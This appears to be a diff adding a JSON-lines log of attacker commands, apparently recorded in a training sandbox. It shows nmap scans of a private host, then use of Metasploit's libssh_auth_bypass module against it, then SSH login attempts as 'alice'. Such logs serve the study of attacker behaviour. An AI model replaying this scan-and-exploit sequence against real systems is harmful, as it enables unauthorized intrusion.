@@ -1,0 +1,22 @@
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:31:30.503032Z","hostname":"attacker","cmd":"nmap -p 1-1000 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:33:48.565630Z","hostname":"attacker","cmd":"libssh -h","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:34:43.005975Z","hostname":"attacker","cmd":"nmap -p 1-56000 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:37:22.936167Z","hostname":"attacker","cmd":"sshlib","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:38:32.924329Z","hostname":"attacker","cmd":"sudo apt-get install libssh-dev","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:40:41.935244Z","hostname":"attacker","cmd":"nmap -sV 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:58:25.589867Z","hostname":"attacker","cmd":"nmap -h","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T10:58:39.681413Z","hostname":"attacker","cmd":"nmap -sV 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:06:34.072039Z","hostname":"attacker","cmd":"set RHOST 172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:07:15.381681Z","hostname":"attacker","cmd":"set RPORT 23","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:07:16.959732Z","hostname":"attacker","cmd":"run","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:07:31.712527Z","hostname":"attacker","cmd":"msfconsole","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:08:51.533520Z","hostname":"attacker","cmd":"search libssh","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:09:32.532161Z","hostname":"attacker","cmd":"set RHOST 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:10:02.974847Z","hostname":"attacker","cmd":"set RPORT 23","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:10:48.341583Z","hostname":"attacker","cmd":"use auxiliary/scanner/ssh/libssh_auth_bypass","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:10:51.562010Z","hostname":"attacker","cmd":"run","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:11:27.069323Z","hostname":"attacker","cmd":"set RHOSTS 172.18.1.5","ip":"10.0.135.83"}
+{"cmd_type":"msf-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:11:31.115298Z","hostname":"attacker","cmd":"run","ip":"10.0.135.83"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:13:58.774319Z","hostname":"attacker","cmd":".ssh alice@172.18.1.5:22","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:14:04.398880Z","hostname":"attacker","cmd":"ssh alice@172.18.1.5:22","ip":"10.0.135.83","username":"root","wd":"/root"}
+{"cmd_type":"bash-command","pool_id":"0","sandbox_id":"113","timestamp_str":"2019-09-19T11:14:07.573895Z","hostname":"attacker","cmd":"ssh alice@172.18.1.5","ip":"10.0.135.83","username":"root","wd":"/root"}
